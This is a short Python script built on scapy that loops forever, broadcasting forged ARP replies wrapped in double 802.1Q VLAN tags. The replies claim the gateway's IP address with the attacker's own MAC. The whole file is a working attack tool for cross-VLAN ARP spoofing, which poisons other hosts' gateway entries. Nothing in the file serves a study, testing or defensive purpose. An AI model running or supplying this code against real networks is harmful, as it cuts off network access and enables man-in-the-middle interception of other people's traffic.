import time
from scapy.all import *
from scapy.layers.inet import IP, ICMP
from scapy.layers.l2 import Ether, Dot1Q, ARP
from scapy.sendrecv import sendp
import argparse
import getmac


def arp_broken():
    for v in tvlan:
        # broadcast the ARP packets and force other device change their gateway MAC
        pkt = Ether(src=mymac, dst="ff:ff:ff:ff:ff:ff")/Dot1Q(vlan=self_vlan)/Dot1Q(vlan=int(v))/ARP(op=2, hwsrc=mymac, psrc=gateway_ip)
        sendp(pkt)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='flooding ARP network broken packets with cross vlan function, '
                                                 'this script required native vlan environment')
    parser.add_argument("-g", help="gateway ip address", required=True, type=str)
    parser.add_argument("-sv", help="self vlan, must be native vlan", required=True, type=int)
    parser.add_argument("-tv", help="target vlan, use a range like 1-100 or list 1 2 3..", nargs='+', required=True, type=str)
    parser.add_argument("-i", help="specified he interface on your device", required=True, type=str)
    args = parser.parse_args()
    try:
        tvlan = [i for i in range(int(args.tv[0].split("-")[0]), int(args.tv[0].split("-")[1]))]
    except:
        tvlan = args.tv
    gateway_ip = args.g
    self_vlan = args.sv
    iface = args.i
    mymac = getmac.get_mac_address(iface)
    while 1:
        arp_broken()
        time.sleep(1)